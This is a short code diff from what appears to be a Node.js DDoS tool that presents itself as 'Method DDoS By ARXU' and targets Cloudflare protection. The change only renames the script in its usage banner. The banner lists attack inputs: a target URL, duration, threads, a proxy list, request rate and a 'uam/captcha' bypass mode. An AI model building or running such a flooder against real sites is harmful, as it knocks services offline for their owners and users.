@@ -210,7 +210,7 @@ module.exports = function Cloudflare() {
  process.on('uncaughtException', function (exception) {
  });
 
- if (process.argv.length < 8){console.log(`Method DDoS By ARXU\n Usage: node BYPASS.js target time thread proxy.txt rate uam/captcha\nExample: node BYPASS https;//example.com 120 10 proxy.txt 32 uam`); process.exit();}
+ if (process.argv.length < 8){console.log(`Method DDoS By ARXU\n Usage: node v2.js target time thread proxy.txt rate uam/captcha\nExample: node v2.js https;//example.com 120 10 proxy.txt 32 uam`); process.exit();}
  const headers = {};
   function readLines(filePath) {
      return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
